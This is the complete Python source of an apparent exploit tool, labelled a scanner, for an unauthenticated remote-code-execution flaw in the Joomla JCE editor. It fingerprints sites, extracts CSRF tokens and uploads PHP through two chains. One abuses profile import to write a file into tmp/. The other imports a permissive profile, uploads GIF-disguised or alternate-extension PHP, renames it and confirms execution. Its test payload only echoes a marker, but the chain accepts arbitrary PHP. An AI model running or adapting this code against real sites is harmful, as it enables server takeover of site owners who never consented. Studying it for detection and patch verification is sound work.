#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MASTA CVE-2026-48907 Scanner
Author : Hussein Mohamed (masta ghimau)
CVE    : CVE-2026-48907
Desc   : Joomla! JCE < 2.9.99.5 Unauthenticated RCE
"""

import argparse
import datetime
import http.cookiejar
import json
import os
import random
import re
import ssl
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment
    HAS_OPENPYXL = True
except ImportError:
    HAS_OPENPYXL = False

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box as rich_box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

__author__ = "Hussein Mohamed masta ghimau"
__tool__ = "masta-cve-2026-48907"

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════
JOOMLA_LATEST = "6.1.1"
JCE_PATCHED = "2.9.99.5"
JCE_LATEST = "2.9.99.7"
TIMEOUT = 12
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

# ── Payload asal yang pernah confirm hit jkrns ──
def _make_verify_payload(expected: int) -> str:
    return (
        "masta-cve-2026-48907 poc. Authorized security assessment. Please delete this file!\n"
        "<?php "
        f"echo 'RXST:'.base64_encode('MATHOK:{expected}').':RXEND';"
        " ?>"
    )


def _check_execution(body: str, expected: int) -> bool:
    import base64
    m = re.search(r'RXST:([A-Za-z0-9+/=]+):RXEND', body)
    if not m:
        return False
    try:
        decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
        return f"MATHOK:{expected}" in decoded
    except Exception:
        return False


LOCK = threading.Lock()


# ═══════════════════════════════════════════════════════════════════════════
#  STYLE / COLORS
# ═══════════════════════════════════════════════════════════════════════════
class S:
    RST = "\033[0m"; BLD = "\033[1m"; RED = "\033[91m"; GRN = "\033[92m"
    YEL = "\033[93m"; BLU = "\033[94m"; CYN = "\033[96m"; WHT = "\033[97m"
    GRY = "\033[90m"; MAG = "\033[95m"


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def _wrap(text, width=70):
    if not text:
        return []
    import textwrap
    return textwrap.wrap(str(text), width=width)


def print_banner():
    pad = lambda t, w: t + " " * (w - len(t))
    print(
        f"{S.CYN}{S.BLD}"
        f"╔══════════════════════════════════════════════════════════════════════════╗\n"
        f"║ {pad('MASTA CVE-2026-48907 Scanner', 72)} ║\n"
        f"║ {pad(f'Author : {__author__}', 72)} ║\n"
        f"║ {pad('CVE    : CVE-2026-48907', 72)} ║\n"
        f"║ {pad(f'Desc   : Joomla! JCE < {JCE_PATCHED} Unauthenticated RCE', 72)} ║\n"
        f"╚══════════════════════════════════════════════════════════════════════════╝"
        f"{S.RST}\n"
        f"{S.YEL}[!] LEGAL DISCLAIMER{S.RST}\n"
        f"    This tool is for AUTHORIZED SECURITY TESTING ONLY.\n"
        f"    Scanning systems without permission is ILLEGAL.\n"
        f"    All uploaded POC files MUST be manually deleted after testing.\n"
    )


# ═══════════════════════════════════════════════════════════════════════════
#  MULTIPART (stdlib only)
# ═══════════════════════════════════════════════════════════════════════════
def _make_boundary():
    return "".join(random.choices(string.ascii_letters + string.digits, k=32))


def build_multipart(fields, files):
    bnd = _make_boundary()
    body = b""
    for name, value in fields.items():
        body += f"--{bnd}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        body += str(value).encode("utf-8") + b"\r\n"
    for field_name, (filename, data, ctype) in files.items():
        body += f"--{bnd}\r\n".encode()
        body += (
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'
        ).encode()
        body += f"Content-Type: {ctype}\r\n\r\n".encode()
        body += data if isinstance(data, bytes) else data.encode("utf-8")
        body += b"\r\n"
    body += f"--{bnd}--\r\n".encode()
    return f"multipart/form-data; boundary={bnd}", body


# ═══════════════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ═══════════════════════════════════════════════════════════════════════════
class HttpSession:
    def __init__(self, base, timeout=TIMEOUT, proxy=None):
        self.base = base.rstrip("/")
        self.to = timeout
        self.jar = http.cookiejar.CookieJar()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers = [
            urllib.request.HTTPSHandler(context=ctx),
            urllib.request.HTTPCookieProcessor(self.jar),
        ]
        if proxy:
            handlers.append(
                urllib.request.ProxyHandler({"http": proxy, "https": proxy})
            )
        self.opener = urllib.request.build_opener(*handlers)

    def _req(self, path, method="GET", headers=None, data=None, timeout=None):
        url = path if path.startswith("http") else f"{self.base}{path}"
        hdr = {"User-Agent": UA}
        if headers:
            hdr.update(headers)
        req = urllib.request.Request(url, method=method, headers=hdr, data=data)
        try:
            with self.opener.open(req, timeout=timeout or self.to) as resp:
                raw = resp.read(2 * 1024 * 1024)
                return {
                    "status": resp.status,
                    "headers": {k.lower(): v for k, v in resp.headers.items()},
                    "body": raw.decode("utf-8", errors="replace"),
                }
        except urllib.error.HTTPError as e:
            try:
                body = e.read(65536).decode("utf-8", errors="replace")
            except Exception:
                body = ""
            err_hdrs = {}
            try:
                err_hdrs = {k.lower(): v for k, v in e.headers.items()}
            except Exception:
                pass
            return {"status": e.code, "headers": err_hdrs, "body": body}
        except Exception as e:
            return {"status": 0, "headers": {}, "body": str(e)}

    def get(self, path, headers=None, timeout=None):
        return self._req(path, "GET", headers=headers, timeout=timeout)

    def post(self, path, fields=None, files=None, raw_body=None, raw_ct=None,
             headers=None, timeout=None):
        hdr = dict(headers or {})
        if raw_body is not None:
            body = raw_body
            hdr["Content-Type"] = raw_ct or "application/x-www-form-urlencoded"
        elif files:
            ct, body = build_multipart(fields or {}, files)
            hdr["Content-Type"] = ct
        elif fields:
            body = urllib.parse.urlencode(fields).encode()
            hdr["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = b""
        return self._req(path, "POST", headers=hdr, data=body, timeout=timeout)


# ═══════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═══════════════════════════════════════════════════════════════════════════
def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def is_patched(version_str):
    if not version_str:
        return False
    try:
        parts = [int(x) for x in version_str.split(".")]
        p = [2, 9, 99, 5]
        for a, b in zip(parts, p):
            if a > b:
                return True
            if a < b:
                return False
        return len(parts) >= len(p)
    except Exception:
        return False


def version_less_than(v1, v2):
    if not v1 or not v2:
        return False
    try:
        a = [int(x) for x in v1.split(".")]
        b = [int(x) for x in v2.split(".")]
        for i in range(max(len(a), len(b))):
            av = a[i] if i < len(a) else 0
            bv = b[i] if i < len(b) else 0
            if av < bv:
                return True
            if av > bv:
                return False
        return False
    except Exception:
        return v1 != v2


def _upgrade_advice(res):
    parts = []
    jv = res.get("joomla_version")
    jcv = res.get("jce_version")
    if jv and version_less_than(jv, JOOMLA_LATEST):
        parts.append(f"Consider upgrading Joomla! from {jv} to latest {JOOMLA_LATEST}.")
    if jcv and version_less_than(jcv, JCE_LATEST):
        parts.append(f"Consider upgrading JCE from {jcv} to latest {JCE_LATEST}.")
    return " ".join(parts) if parts else ""


def waf_check(resp):
    if not resp:
        return False, None
    body = resp.get("body", "").lower()
    hdrs = " ".join(f"{k}:{v}" for k, v in resp.get("headers", {}).items()).lower()
    combo = body + hdrs
    signs = [
        ("Cloudflare", ["cf-ray", "cloudflare", "attention required"]),
        ("Incapsula", ["x-iinfo", "incapsula", "incident id"]),
        ("Sucuri", ["x-sucuri", "sucuri"]),
        ("ModSecurity", ["mod_security", "modsecurity", "406 not acceptable"]),
    ]
    for name, keys in signs:
        if any(k in combo for k in keys):
            return True, name
    return False, None


# ═══════════════════════════════════════════════════════════════════════════
#  FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════════
def probe_joomla(sess):
    res = {"found": False, "version": None}
    body = ""
    home_headers = {}
    r = sess.get("/")
    if r and r["status"] == 200:
        body = r.get("body", "")
        home_headers = r.get("headers", {})
        m = re.search(
            r'<meta\s+name="generator"\s+content="Joomla!\s+([0-9\.]+)"',
            body,
            re.I,
        )
        if m:
            return {"found": True, "version": m.group(1).strip()}
        joomla_signs = [
            "/templates/", "/media/jui/", "/media/system/",
            "/components/com_", "/modules/mod_", "/plugins/",
            "joomla", "Joomla", "/administrator/",
            "com_content", "com_users", "com_config",
            "option=com_", "view=article", "task=category",
            "data-joomla-version", "joomla-script-options",
            "joomla-capsule", "joomla.core",
        ]
        match_count = sum(1 for s in joomla_signs if s.lower() in body.lower())
        if match_count >= 2:
            res["found"] = True
        if re.search(r"window\.Joomla\s*=\s*\{", body):
            res["found"] = True
    hdr_str = " ".join(f"{k}:{v}" for k, v in home_headers.items()).lower()
    if "joomla" in hdr_str or re.search(r"set-cookie:\s*[0-9a-f]{32}=", hdr_str):
        res["found"] = True
    static_assets = [
        "/media/system/js/core.js",
        "/media/system/js/keepalive.js",
        "/templates/system/css/error.css",
        "/templates/system/css/system.css",
    ]
    for asset in static_assets:
        ra = sess.get(asset, timeout=5)
        if ra and ra["status"] == 200 and len(ra.get("body", "")) > 20:
            res["found"] = True
            break
    r = sess.get("/administrator/index.php", timeout=6)
    if r and r["status"] == 200:
        ab = r.get("body", "").lower()
        if any(
            k in ab
            for k in [
                "joomla", "form-login", 'class="login"',
                "joomla-administrator", "admin-login", "jform",
            ]
        ):
            res["found"] = True
            m = re.search(r"joomla!?\s*v?([0-9\.]+)", ab, re.I)
            if m:
                res["version"] = m.group(1).strip()
    for p in [
        "/administrator/manifest.xml",
        "/administrator/manifests/files/joomla.xml",
        "/administrator/manifests/packages/pkg_joomla.xml",
    ]:
        r = sess.get(p, timeout=6)
        if r and r["status"] == 200:
            m = re.search(r"<version>([0-9\.]+)</version>", r["body"])
            if m:
                return {"found": True, "version": m.group(1).strip()}
            res["found"] = True
    for p in [
        "/administrator/components/com_content/content.xml",
        "/administrator/components/com_media/media.xml",
        "/administrator/components/com_users/users.xml",
    ]:
        r = sess.get(p, timeout=6)
        if r and r["status"] == 200:
            m = re.search(r"<version>([0-9\.]+)</version>", r["body"])
            if m:
                return {"found": True, "version": m.group(1).strip()}
            res["found"] = True
    for p in ["/language/en-GB/en-GB.xml", "/administrator/language/en-GB/en-GB.xml"]:
        r = sess.get(p, timeout=6)
        if r and r["status"] == 200:
            m = re.search(r"<version>([0-9\.]+)</version>", r["body"])
            if m:
                return {"found": True, "version": m.group(1).strip()}
            res["found"] = True
    r = sess.get("/README.txt", timeout=6)
    if r and r["status"] == 200 and "joomla" in r.get("body", "").lower():
        res["found"] = True
    return res


def probe_jce(sess):
    res = {"found": False, "version": None}
    for p in [
        "/plugins/editors/jce/jce.xml",
        "/administrator/components/com_jce/jce.xml",
    ]:
        r = sess.get(p, timeout=6)
        if r and r["status"] == 200 and len(r.get("body", "")) > 20:
            m = re.search(r"<version>([^<]+)</version>", r["body"])
            if m:
                return {"found": True, "version": m.group(1).strip()}
            res["found"] = True
    for p in [
        "/plugins/system/jcemediabox/js/jcemediabox.js",
        "/plugins/system/jce/css/content.css",
        "/media/editors/jce/js/editor.min.js",
    ]:
        r = sess.get(p, timeout=6)
        if r and r["status"] == 200 and len(r.get("body", "")) > 20:
            res["found"] = True
    r = sess.get("/index.php?option=com_jce&task=explorer", timeout=6)
    if r and r["status"] == 200 and "jce" in r.get("body", "").lower():
        res["found"] = True
    return res


def extract_csrf(sess):
    r = sess.get("/")
    if not r or r["status"] != 200:
        return None
    body = r.get("body", "")
    patterns = [
        r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
        r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
        r'name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"',
        r'name="token"\s+content="([a-f0-9]{32})"',
        r'data-joomla-token="([a-f0-9]{32})"',
    ]
    for pat in patterns:
        m = re.search(pat, body, re.I)
        if m:
            return m.group(1)
    m = re.search(r'<input\s+type="hidden"\s+name="([a-f0-9]{32})"\s+value="1"', body, re.I)
    if not m:
        m = re.search(r'<input\s+name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"', body, re.I)
    return m.group(1) if m else None


# ═══════════════════════════════════════════════════════════════════════════
#  VECTOR 1 — Profile Import to tmp/  (JoomlaSniper style: 200 = success)
# ═══════════════════════════════════════════════════════════════════════════
def vector1_tmp(sess, token, payload_php, filename):
    """
    Upload arbitrary PHP via JCE profile import.
    File lands in Joomla's tmp/ folder.
    JoomlaSniper proven: any HTTP 200 means the file was likely written.
    """
    if not token:
        return False
    r = sess.post(
        "/index.php?option=com_jce",
        fields={"task": "profiles.import", token: "1"},
        files={"profile_file": (filename, payload_php.encode("utf-8"), "application/xml")},
    )
    return r is not None and r["status"] == 200


# ═══════════════════════════════════════════════════════════════════════════
#  VECTOR 2 — Browser Chain (upload via JCE browser + rename)
# ═══════════════════════════════════════════════════════════════════════════
def gifwrap(php):
    return b"GIF89a\n" + php.encode("utf-8")


def php_variants(sn, php):
    variants = [
        (f"{sn}.php", php.encode(), "text/plain"),
        (f"{sn}.php", gifwrap(php), "image/gif"),
        (f"{sn}.phtml", php.encode(), "text/plain"),
        (f"{sn}.php5", php.encode(), "text/plain"),
        (f"{sn}.php7", php.encode(), "text/plain"),
    ]
    return variants


def _is_our_file(body):
    if not body:
        return False
    if len(body) < 300:
        return True
    if "<?php" in body or "RXST:" in body or "GIF89a" in body:
        return True
    if re.search(r"<\s*(html|!DOCTYPE)", body, re.I):
        return False
    return len(body) < 2000


def _has_feed(sess):
    r = sess.get("/index.php?option=com_jce&task=cpanel.feed", timeout=6)
    return bool(r and r["status"] == 200 and '"feeds"' in r["body"])


def _import_permissive_profile(sess, token):
    if not token:
        return False
    nm = f"M{rand_str(6)}"
    jp = json.dumps({
        "browser": {
            "filetypes": "images=jpg,jpeg,png,gif;files=php,txt,gif",
            "upload": {
                "max_size": "102400",
                "validate_mimetype": "0",
                "add_random": "0",
            },
            "features": {
                "upload": 1,
                "folder": {"rename": 1},
                "file": {"rename": 1},
            },
        }
    })
    xml = (
        f'<?xml version="1.0"?><jce><profiles><profile>'
        f"<name>{nm}</name><published>1</published>"
        f"<ordering>-99999</ordering><area>0</area>"
        "<device>desktop,tablet,phone</device>"
        "<components></components><users></users>"
        "<types>1,8</types><rows><![CDATA[[]]]></rows>"
        "<plugins>browser,image,media,link,file</plugins>"
        f"<params><![CDATA[{jp}]]></params>"
        "</profile></profiles></jce>"
    )
    r = sess.post(
        "/index.php?option=com_jce",
        fields={"task": "profiles.import", token: "1"},
        files={"profile_file": ("x.xml", xml.encode(), "application/xml")},
    )
    if not r or r["status"] != 200:
        return False
    try:
        data = json.loads(r["body"])
        for k in ("message", "error"):
            for msg in data.get("messages", {}).get(k, []):
                if "imported successfully" in msg.lower():
                    return True
    except Exception:
        pass
    return False


def _upload_browser(sess, token, sn, data, filename, ctype):
    if not token:
        return False
    r = sess.post(
        f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
        fields={
            "method": "upload",
            "upload-dir": "",
            "name": filename,
            token: "1",
        },
        files={"file": (filename, data, ctype)},
    )
    return r is not None and r["status"] == 200


def _try_rename(sess, token, sn, from_ext):
    if not token:
        return None
    rpc = json.dumps({
        "id": "rn",
        "method": "renameItem",
        "params": [f"{sn}.{from_ext}", f"{sn}.php"],
    })
    body = urllib.parse.urlencode({"json": rpc, token: "1"}).encode()
    r = sess.post(
        f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
        raw_body=body,
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    if not r:
        return None
    time.sleep(0.3)
    for check_ext in ["php", f"php.{from_ext}"]:
        v = sess.get(f"/images/{sn}.{check_ext}", timeout=5)
        if v and v["status"] == 200 and _is_our_file(v.get("body", "")):
            return check_ext
    return None


def vector2_browser(sess, token, sn, php_payload):
    if not _has_feed(sess):
        return False, None
    if not _import_permissive_profile(sess, token):
        return False, None
    time.sleep(0.3)

    for filename, data, ct in php_variants(sn, php_payload):
        if not _upload_browser(sess, token, sn, data, filename, ct):
            continue
        time.sleep(0.3)
        ext = filename.rsplit(".", 1)[-1]
        v = sess.get(f"/images/{sn}.{ext}", timeout=5)
        if v and v["status"] == 200 and _is_our_file(v.get("body", "")):
            return True, ext

    gif_data = gifwrap(php_payload)
    gif_name = f"{sn}.gif"
    if _upload_browser(sess, token, sn, gif_data, gif_name, "image/gif"):
        time.sleep(0.3)
        new_ext = _try_rename(sess, token, sn, "gif")
        if new_ext:
            return True, new_ext
    return False, None


def cleanup_notice(filename, tmp_url=None, images_path=None):
    msg = f"[!] MANUAL CLEANUP REQUIRED: Delete uploaded POC file '{filename}' from server."
    if tmp_url:
        msg += f" Found at: {tmp_url}"
    if images_path:
        msg += f" Also check: {images_path}"
    return msg


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN EXPLOIT ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════
def run_exploit(target_url, proxy=None, timeout=TIMEOUT, debug=False):
    t0 = time.time()
    def _log(msg):
        if debug:
            print(f"      [DEBUG] {msg}")

    res = {
        "target": target_url,
        "timestamp": datetime.datetime.now().isoformat(),
        "joomla_found": False,
        "joomla_version": None,
        "jce_found": False,
        "jce_version": None,
        "jce_outdated": None,
        "csrf_found": False,
        "waf_detected": False,
        "waf_name": None,
        "patched": False,
        "status": "SAFE",
        "confidence": "LOW",
        "proof_url": None,
        "detail": "",
        "uploaded_filename": None,
        "scan_time_ms": 0,
        "action": "",
    }

    try:
        sess = HttpSession(target_url, timeout=timeout, proxy=proxy)
    except Exception as e:
        res["status"] = "ERROR"
        res["detail"] = f"Connection failed: {e}"
        res["scan_time_ms"] = int((time.time() - t0) * 1000)
        res["action"] = "Check network connectivity and target URL."
        return res

    # --- Joomla detection ---
    _log("[0] Probing Joomla...")
    jo = probe_joomla(sess)
    res["joomla_found"] = jo["found"]
    res["joomla_version"] = jo["version"]
    _log(f"    Joomla found={jo['found']} version={jo['version']}")

    # --- JCE detection ---
    _log("[1] Probing JCE...")
    jc = probe_jce(sess)
    res["jce_found"] = jc["found"]
    res["jce_version"] = jc["version"]
    if jc["version"]:
        res["jce_outdated"] = not is_patched(jc["version"])

    if jc["found"]:
        res["joomla_found"] = True

    if not res["joomla_found"] and not jc["found"]:
        res["status"] = "NOT_JOOMLA"
        res["confidence"] = "CERTAIN"
        res["detail"] = "Joomla! not detected."
        res["scan_time_ms"] = int((time.time() - t0) * 1000)
        res["action"] = "No action required."
        return res

    if not jc["found"]:
        res["status"] = "SAFE"
        res["confidence"] = "HIGH"
        res["detail"] = "JCE component not installed."
        res["scan_time_ms"] = int((time.time() - t0) * 1000)
        advice = _upgrade_advice(res)
        res["action"] = "No action required for this CVE. JCE is not installed."
        if advice:
            res["action"] += f" {advice}"
        return res

    if jc["version"] and is_patched(jc["version"]):
        res["patched"] = True
        res["status"] = "PATCHED"
        res["confidence"] = "HIGH"
        res["detail"] = f"JCE {jc['version']} >= {JCE_PATCHED} (patched)."
        res["scan_time_ms"] = int((time.time() - t0) * 1000)
        advice = _upgrade_advice(res)
        res["action"] = f"Ensure JCE remains at {JCE_PATCHED} or later."
        if advice:
            res["action"] += f" {advice}"
        return res

    # --- CSRF ---
    _log("[2] Extracting CSRF token...")
    token = extract_csrf(sess)
    res["csrf_found"] = bool(token)
    tk = token[:16] + "..." if token and len(token) > 20 else str(token)
    _log(f"    token={tk}")
    if not token:
        res["status"] = "PATCHED"
        res["confidence"] = "MEDIUM"
        res["detail"] = "CSRF token missing — may be patched or incompatible."
        res["scan_time_ms"] = int((time.time() - t0) * 1000)
        return res

    # --- Payload ---
    a, b = random.randint(100, 999), random.randint(100, 999)
    expected = a * b
    payload_php = _make_verify_payload(expected)

    sn = f"masta{rand_str(6)}"
    filename = f"{sn}.xml.php"

    # ═══ Vector 1: Profile Import to tmp/ / root ═══
    _log("[3] Vector 1: profile import → tmp/")
    v1_ok = vector1_tmp(sess, token, payload_php, filename)
    _log(f"    profile import HTTP status={'OK' if v1_ok else 'FAIL'}")
    if debug and v1_ok:
        # Debug: show a snippet of the POST response body
        dbg_r = sess.post(
            "/index.php?option=com_jce",
            fields={"task": "profiles.import", token: "1"},
            files={"profile_file": (filename, payload_php.encode("utf-8"), "application/xml")},
        )
        _log(f"    POST body (first 200 chars): {dbg_r.get('body','')[:200]!r}")

    if v1_ok:
        time.sleep(0.3)
        for tmp_path in [f"/tmp/{filename}", f"/{filename}"]:
            proof_url = f"{sess.base}{tmp_path}"
            v = sess.get(tmp_path, timeout=8)

            waf, wname = waf_check(v)
            if waf:
                res["waf_detected"] = True
                res["waf_name"] = wname
                res["status"] = "BLOCKED_BY_WAF"
                res["confidence"] = "LOW"
                res["detail"] = f"WAF ({wname}) triggered during verification."
                res["uploaded_filename"] = filename
                res["scan_time_ms"] = int((time.time() - t0) * 1000)
                return res

            if v and v["status"] == 200:
                if _check_execution(v["body"], expected):
                    res["status"] = "VULNERABLE"
                    res["confidence"] = "CONFIRMED"
                    res["proof_url"] = proof_url
                    res["uploaded_filename"] = filename
                    res["detail"] = (
                        f"RCE confirmed via profile import (math check {a}*{b}={expected}). "
                        + cleanup_notice(filename, tmp_url=proof_url)
                    )
                    res["scan_time_ms"] = int((time.time() - t0) * 1000)
                    res["action"] = f"CRITICAL: Upgrade JCE to >= {JCE_PATCHED} immediately. Delete '{filename}'."
                    return res
                elif len(v.get("body", "")) > 0:
                    res["status"] = "VULNERABLE_UPLOAD_ONLY"
                    res["confidence"] = "HIGH"
                    res["proof_url"] = proof_url
                    res["uploaded_filename"] = filename
                    res["detail"] = (
                        f"File uploaded but PHP execution blocked in tmp/. "
                        + cleanup_notice(filename, tmp_url=proof_url)
                    )
                    res["scan_time_ms"] = int((time.time() - t0) * 1000)
                    res["action"] = f"CRITICAL: Upgrade JCE to >= {JCE_PATCHED} immediately. Delete '{filename}'."
                    return res

    # ═══ Vector 2: Browser chain via images/ ═══
    _log("[4] Vector 2: browser upload → images/")
    if token:
        sn2 = f"masta{rand_str(6)}"
        try:
            v2_ok, ext = vector2_browser(sess, token, sn2, payload_php)
        except Exception as e:
            v2_ok, ext = False, None
            _log(f"    Vector2 exception: {e}")

        _log(f"    Vector2 result ok={v2_ok} ext={ext}")
        if v2_ok and ext:
            time.sleep(0.3)
            for check_ext in ["php", "phtml", "php5", "php7", ext]:
                path = f"/images/{sn2}.{check_ext}"
                proof_url = f"{sess.base}{path}"
                v = sess.get(path, timeout=8)
                if v and v["status"] == 200:
                    if _check_execution(v["body"], expected):
                        res["status"] = "VULNERABLE"
                        res["confidence"] = "CONFIRMED"
                        res["proof_url"] = proof_url
                        res["uploaded_filename"] = f"{sn2}.{check_ext}"
                        res["detail"] = (
                            f"RCE confirmed via browser chain (math check {a}*{b}={expected}). "
                            + cleanup_notice(f"{sn2}.{check_ext}", images_path=proof_url)
                        )
                        res["scan_time_ms"] = int((time.time() - t0) * 1000)
                        res["action"] = f"CRITICAL: Upgrade JCE to >= {JCE_PATCHED} immediately. Delete '{sn2}.{check_ext}'."
                        return res
                    elif "<?php" in v.get("body", ""):
                        res["status"] = "VULNERABLE_UPLOAD_ONLY"
                        res["confidence"] = "HIGH"
                        res["proof_url"] = proof_url
                        res["uploaded_filename"] = f"{sn2}.{check_ext}"
                        res["detail"] = (
                            f"Browser upload ok, PHP exec blocked. "
                            + cleanup_notice(f"{sn2}.{check_ext}", images_path=proof_url)
                        )
                        res["scan_time_ms"] = int((time.time() - t0) * 1000)
                        res["action"] = f"CRITICAL: Upgrade JCE to >= {JCE_PATCHED} immediately. Delete '{sn2}.{check_ext}'."
                        return res

    _log("[5] No vectors succeeded → SAFE")
    res["status"] = "SAFE"
    res["confidence"] = "HIGH"
    res["detail"] = "Exploit vectors failed — likely patched."
    res["scan_time_ms"] = int((time.time() - t0) * 1000)
    advice = _upgrade_advice(res)
    res["action"] = f"No immediate action required. Verify JCE is upgraded to >= {JCE_PATCHED}."
    if advice:
        res["action"] += f" {advice}"
    return res


# ═══════════════════════════════════════════════════════════════════════════
#  TERMINAL UI & EXCEL (unchanged logic)
# ═══════════════════════════════════════════════════════════════════════════
def _strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*m', '', text)


def _vis_len(text):
    return len(_strip_ansi(text))


def _pad(text, width):
    return text + ' ' * max(0, width - _vis_len(text))


def print_card(res):
    st = res["status"]
    cmap = {
        "VULNERABLE": S.RED, "VULNERABLE_UPLOAD_ONLY": S.YEL,
        "PATCHED": S.GRN, "SAFE": S.BLU,
        "BLOCKED_BY_WAF": S.YEL, "NOT_JOOMLA": S.GRY, "ERROR": S.GRY
    }
    c = cmap.get(st, S.WHT)

    jv = res["joomla_version"] or "unknown"
    jcv = res["jce_version"] or "unknown"

    if jv != "unknown" and version_less_than(jv, JOOMLA_LATEST):
        joomla_status = f"{S.YEL}Outdated{S.RST}"
    elif jv != "unknown":
        joomla_status = f"{S.GRN}Up-to-date{S.RST}"
    else:
        joomla_status = f"{S.GRY}N/A{S.RST}"

    if res.get("jce_outdated") is True:
        jce_status = f"{S.RED}Vulnerable (< {JCE_PATCHED}){S.RST}"
    elif res.get("jce_outdated") is False:
        jce_status = f"{S.GRN}Patched (>= {JCE_PATCHED}){S.RST}"
    else:
        jce_status = f"{S.GRY}N/A{S.RST}"

    conf = res["confidence"]
    conf_color = S.GRN if conf in ("CONFIRMED", "HIGH", "CERTAIN") else S.YEL if conf == "MEDIUM" else S.GRY

    if HAS_RICH:
        _RMAP = {S.RED: "red", S.YEL: "yellow", S.GRN: "green", S.BLU: "blue", S.GRY: "grey50", S.WHT: "white"}
        rc = _RMAP.get(c, "white")
        rconf = _RMAP.get(conf_color, "white")

        console = Console()
        table = Table(box=rich_box.ROUNDED, expand=False, width=78, show_header=True, header_style="bold cyan")
        table.add_column("Component", style="cyan", width=14)
        table.add_column("Installed", width=16)
        table.add_column("Latest", style="green", width=16)
        table.add_column("Status / Note", width=28)

        j_inst = "yellow" if jv != "unknown" and version_less_than(jv, JOOMLA_LATEST) else "white" if jv == "unknown" else "green"
        c_inst = "red" if res.get("jce_outdated") is True else "white" if jcv == "unknown" else "green"
        table.add_row("Joomla!", f"[{j_inst}]{jv}[/{j_inst}]", JOOMLA_LATEST, _strip_ansi(joomla_status))
        table.add_row("JCE", f"[{c_inst}]{jcv}[/{c_inst}]", JCE_LATEST, _strip_ansi(jce_status))

        console.print()
        console.print(Panel(table, title=f"[bold {rc}]{st}[/bold {rc}]", border_style=rc))
        console.print(f"  [bold]Status[/]     : [{rc}]{st}[/{rc}]")
        console.print(f"  [bold]Confidence[/] : [{rconf}]{conf}[/{rconf}]")
        waf_text = res['waf_name'] if res['waf_detected'] else 'None'
        console.print(f"  [bold]WAF[/]        : {waf_text}")
        if res["proof_url"]:
            console.print(f"  [bold]Proof URL[/]  : {res['proof_url']}")
        if res.get("uploaded_filename"):
            console.print(f"  [bold]Uploaded[/]   : {res['uploaded_filename']}")
        for i, line in enumerate(_wrap(res.get('detail', ''), 72)):
            lbl = "[bold]Detail[/]" if i == 0 else " " * 12
            console.print(f"  {lbl}     : {line}")
        for i, line in enumerate(_wrap(res.get('action', ''), 72)):
            lbl = "[bold]Action[/]" if i == 0 else " " * 12
            console.print(f"  {lbl}     : {line}")
        console.print()
        return

    joomla_col = S.YEL if jv != "unknown" and version_less_than(jv, JOOMLA_LATEST) else S.GRN if jv != "unknown" else S.GRY
    jce_col = S.RED if res.get("jce_outdated") is True else S.GRN if res.get("jce_outdated") is False else S.GRY

    print()
    print(f"{c}{'═'*76}{S.RST}")
    print(f"{c}  {st}{S.RST}")
    print(f"{c}{'═'*76}{S.RST}")
    print(f"  {_pad('Target', 12)} : {res['target']}")
    print()
    print(f"  ┌──────────────┬────────────────┬────────────────┬────────────────────────┐")
    print(f"  │ {_pad(S.CYN+'Component'+S.RST, 12)} │ {_pad(S.CYN+'Installed'+S.RST, 14)} │ {_pad(S.CYN+'Latest'+S.RST, 14)} │ {_pad(S.CYN+'Status / Note'+S.RST, 22)} │")
    print(f"  ├──────────────┼────────────────┼────────────────┼────────────────────────┤")
    print(f"  │ {_pad(f'{S.CYN}Joomla!{S.RST}', 12)} │ {_pad(f'{joomla_col}{jv}{S.RST}', 14)} │ {_pad(f'{S.GRN}{JOOMLA_LATEST}{S.RST}', 14)} │ {_pad(joomla_status, 22)} │")
    print(f"  │ {_pad(f'{S.CYN}JCE{S.RST}', 12)} │ {_pad(f'{jce_col}{jcv}{S.RST}', 14)} │ {_pad(f'{S.GRN}{JCE_LATEST}{S.RST}', 14)} │ {_pad(jce_status, 22)} │")
    print(f"  └──────────────┴────────────────┴────────────────┴────────────────────────┘")
    print()
    print(f"  {_pad('Status', 12)} : {c}{st}{S.RST}")
    print(f"  {_pad('Confidence', 12)} : {conf_color}{conf}{S.RST}")
    waf_text = res['waf_name'] if res['waf_detected'] else 'None'
    print(f"  {_pad('WAF', 12)} : {waf_text}")
    if res["proof_url"]:
        print(f"  {_pad('Proof URL', 12)} : {res['proof_url']}")
    if res.get("uploaded_filename"):
        print(f"  {_pad('Uploaded', 12)} : {res['uploaded_filename']}")
    for i, line in enumerate(_wrap(res.get('detail', ''), 70)):
        label = "Detail" if i == 0 else " " * 6
        print(f"  {_pad(label, 12)} : {line}")
    for i, line in enumerate(_wrap(res.get('action', ''), 70)):
        label = "Action" if i == 0 else " " * 6
        print(f"  {_pad(label, 12)} : {line}")
